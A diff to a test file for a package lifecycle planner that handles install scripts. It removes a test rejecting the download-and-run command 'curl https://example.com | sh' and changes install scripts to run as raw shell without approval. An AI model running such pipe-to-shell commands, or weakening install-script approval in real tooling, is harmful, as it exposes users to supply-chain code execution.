@@ -103,14 +103,17 @@ test('UTF-8 output budgets never split Hebrew or emoji', async () => {
   }
 });
 
-test('lifecycle planner accepts brokered actions and rejects shell syntax', () => {
+test('lifecycle planner preserves original portable shell source and rejects malformed syntax', () => {
   const accepted = planLifecycle({ name: 'fixture', version: '1.0.0', scripts: { install: 'node setup.mjs', prepare: 'npm run compile', compile: 'tsc --project tsconfig.json' } }, 'sha512-fixture');
-  assert.equal(accepted.requiresApproval, true);
+  assert.equal(accepted.requiresApproval, false);
   assert.equal(accepted.executable, true);
-  assert.deepEqual(accepted.actions.map(action => action.kind), ['node', 'typescript']);
-  const rejected = planLifecycle({ name: 'fixture', version: '1.0.0', scripts: { postinstall: 'curl https://example.com | sh' } });
+  assert.deepEqual(accepted.actions.map(action => action.kind), ['portableShell', 'portableShell']);
+  assert.deepEqual(accepted.actions.map(action => action.source), ['node setup.mjs','npm run compile']);
+  const complex = "VALUE='שלום world' node setup.mjs && echo done | cat > output.txt";
+  assert.equal(planLifecycle({name:'fixture',version:'1.0.0',scripts:{postinstall:complex}}).actions[0].source,complex);
+  const rejected = planLifecycle({ name: 'fixture', version: '1.0.0', scripts: { postinstall: "echo 'unclosed" } });
   assert.equal(rejected.executable, false);
-  assert.match(rejected.rejected[0].reason, /unsupported/i);
+  assert.match(rejected.rejected[0].reason, /expected|syntax|unterminated/i);
 });
 
 test('failed executions preserve aggregate HTTPS cause codes', async () => {
